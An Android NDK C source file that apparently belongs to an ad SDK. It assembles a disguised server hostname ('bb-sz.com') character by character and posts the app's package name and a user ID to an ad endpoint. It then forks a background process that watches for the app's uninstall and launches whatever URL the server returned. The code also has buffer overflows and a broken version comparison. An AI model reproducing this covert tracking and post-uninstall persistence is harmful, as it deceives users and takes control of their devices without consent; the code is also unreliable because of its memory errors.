//
// Created by Administrator on 2016/11/22.
//

#include <pthread.h>


#include <unistd.h>
#include "log.h"
#include <sys/system_properties.h>
#include "http.h"
#include "reflex.h"

static const char *END = "\r\n";
static const char *GET = "POST ";

char *pkg3 = "";
char *mUid3 = "";
static JavaVM *vvm3;
static jclass mAppClz3;


void startFork(char *pd, const char *url) {
    int tag = JNI_TRUE;
    if (tag)LOGI("app uninstall,current pkg = %s", pd);
    if (tag)LOGI("app uninstall,current url = %s", url);
    char s_version[10];
    __system_property_get("ro.build.version.sdk", s_version);
    if (tag)LOGI("app uninstall,current sdkversion = %s", s_version);
//    if (s_version >= 19){
//        return;
//    }
    pid_t pid = fork();
    if (pid < 0) {
        if (tag)LOGI("current crate process failure");
        return;
    } else if (pid > 0) {
        // 说明克隆进程成功，而且该代码运行在父进程中
        if (tag)LOGI("create process success,current parent pid = %d", pid);
        return;
    } else {
        // 说明克隆进程成功，而且代码运行在子进程中
        if (tag)LOGI("create process success,current child pid = %d", pid);
        while (JNI_TRUE) {
//            //子进程注册目录监听器
//            int fileDescriptor = inotify_init();
//            if (fileDescriptor < 0) {
//                return;
//            }
            char *fileStr = malloc(sizeof("/data/data//files") + sizeof(pd));
            strcpy(fileStr, "/data/data/");
            strcat(fileStr, pd);
            strcat(fileStr, "/files");
//            int watchDescriptor = inotify_add_watch(fileDescriptor, fileStr, IN_DELETE);
            FILE *file = fopen(fileStr, "rt");
            free(fileStr);
//            if (watchDescriptor < 0) {
//                return;
//            }

//            //分配缓存，以便读取event，缓存大小=一个struct inotify_event的大小，这样一次处理一个event
//            void *p_buf = malloc(sizeof(struct inotify_event));
//            if (p_buf == NULL) {
//                return;
//            }
//            //开始监听
//            //read会阻塞进程，
//            ssize_t readBytes = read(fileDescriptor, p_buf, sizeof(struct inotify_event));
//            //走到这里说明收到目录被删除的事件，注销监听器
//            free(p_buf);
//            inotify_rm_watch(fileDescriptor, IN_DELETE);
            if (file == NULL) {
                // 应用被卸载了，通知系统打开用户反馈的网页
                if (s_version >= 17) {
                    // Android4.2系统之后支持多用户操作，所以得指定用户
//                sleep(30);
                    if (tag)LOGD("app run uninstall 2, rand = %d", 30);
                    execlp("am", "am", "start", "--user", "0", "-a",
                           "android.intent.action.VIEW", "-d",
                           url, (char *) NULL);
                    return;
                } else {
                    // Android4.2以前的版本无需指定用户
//                sleep(29);
                    if (tag)LOGD("app run uninstall 1, rand = %d", 29);
                    execlp("am", "am", "start", "-a",
                           "android.intent.action.VIEW", "-d",
                           url, (char *) NULL);
                    return;
                }
            } else {
                if (tag)LOGD("app run normal ");
                sleep(5);
            }
        }
    }
}


void runfk(void *jvm) {
    JNIEnv *env;
    jint res = (*vvm3)->GetEnv(vvm3, (void **) &env, JNI_VERSION_1_6);
    if (res != JNI_OK) {
        if (debug) LOGI("[x][fk][run] get env.");
        res = (*vvm3)->AttachCurrentThread(vvm3, &env, NULL);
        if (JNI_OK != res) {
            LOGE("[x][fk][run] Failed to AttachCurrentThread, ErrorCode = %d", res);
            (*vvm3)->DetachCurrentThread(vvm3);
            return;
        }
    }
    char *path = "/ad/fork/getInfo.php ";
    const int port = 80;
    char *host = (char *) malloc(13);
    strcpy(host, "www.");


    int sizeData = sizeof(char) * (strlen("pkg=&uid=") + strlen(pkg3) + strlen(mUid3));
    if (debug) LOGI("[x][fk][run]data size is %d", sizeData);
    char *data = (char *) malloc((size_t) sizeData + 1);
    strcpy(data, "pkg");
    strcat(data, "=");
    strcat(data, pkg3);
    strcat(data, "&uid=");
    strcat(data, mUid3);


    strcat(host, "bb");
    if (debug) LOGI("[x][fk][run] data is %s", data);
    strcat(host, "-");
    strcat(host, "s");
    strcat(host, "z");
    strcat(host, ".com");


    char content[1024];
    strcpy(content, GET);
    strcat(content, path);
    strcat(content, " HTTP/1.1");
    strcat(content, END);

    strcat(content, "Host: ");
    strcat(content, host);
    strcat(content, END);

    strcat(content, "User-Agent:NDK FK");
    strcat(content, END);

    strcat(content, "Accept-Language:zh-cn");
    strcat(content, END);

    strcat(content, "Accept:*/*");
    strcat(content, END);

    strcat(content, "Connection:Keep-Alive");
    strcat(content, END);

    strcat(content, "Content-Type: application/x-www-form-urlencoded");
    strcat(content, END);

    char *len = (char *) malloc(sizeof(char) * strlen(data) + 1);
    sprintf(len, "%d", strlen(data));
    strcat(content, "Content-Length: ");
    strcat(content, len);
    strcat(content, END);
    strcat(content, END);
    strcat(content, data);
    free(len);
    free(data);
    jbyteArray result = httpReq(env, content, host, port);
    free(host);
    if (debug) LOGI("[x][fk][run] http run end.");
    if (result) {
        jobject str = runStaticObjectMethodX(env, mAppClz3, "aa", "([B)Ljava/lang/String;", result);
        if (str) {
            jint len = runIntMethod(env, "java/lang/String", str, "length", "()I");
            if (len > 8) {
                str = runObjectMethod(env, "java/lang/String", str, "substring",
                                      "(I)Ljava/lang/String;", 8);
                str = runObjectMethod(env, "java/lang/String", str, "replaceAll",
                                      "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;",
                                      (*env)->NewStringUTF(env, "[\"\\}]"),
                                      (*env)->NewStringUTF(env, ""));
                str = runObjectMethod(env, "java/lang/String", str, "replaceAll",
                                      "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;",
                                      (*env)->NewStringUTF(env, "[\\\\]"),
                                      (*env)->NewStringUTF(env, ""));
                const char *url = Jstring2CStr(env, str);
                if (url) {
                    startFork(pkg3, url);
                }
            }
        }
        if (debug) LOGI("[x][fk][run] shell check end. run a 1");
    }
    (*vvm3)->DetachCurrentThread(vvm3);
    return;
}

void myFork(JavaVM *vm, JNIEnv *env) {
    if (debug) LOGI("[x][fk] fork start");
    vvm3 = vm;
    jclass tmp = (*env)->FindClass(env, "com/bb_sz/ndk/App");
    mAppClz3 = (jclass) (*env)->NewGlobalRef(env, tmp);
    //get mUID
    jobject uidStr = getStaticObjectField(env, "com/bb_sz/ndk/App", "mUID", "Ljava/lang/String;");
    if (uidStr) {
        mUid3 = Jstring2CStr(env, uidStr);
    }
    //get Context
    jobject context = getStaticObjectField(env, "com/bb_sz/ndk/App", "mContext",
                                           "Landroid/content/Context;");
    if (NULL == context) {
        if (debug) LOGE("[x][fk] failed to get context");
        return;
    }

    // get mPKName
    jobject pkgName = runObjectMethod(env, "android/content/Context", context, "getPackageName",
                                      "()Ljava/lang/String;");
    if (NULL == pkgName) {
        if (debug) LOGE("[x][fk] failed to getPackageName");
        (*env)->DeleteLocalRef(env, context);
        return;
    } else {
        pkg3 = Jstring2CStr(env, pkgName);
        if (debug) LOGI("[x][fk] got  package name = %s", pkg3);
    }

    // start thread
    pthread_t id;
    pthread_attr_t threadAttr_;
    pthread_attr_init(&threadAttr_);
    pthread_attr_setdetachstate(&threadAttr_, PTHREAD_CREATE_DETACHED);
    pthread_create(&id, &threadAttr_, (void *) runfk, vvm3);
    if (debug) LOGI("[x][fk] fork end");

}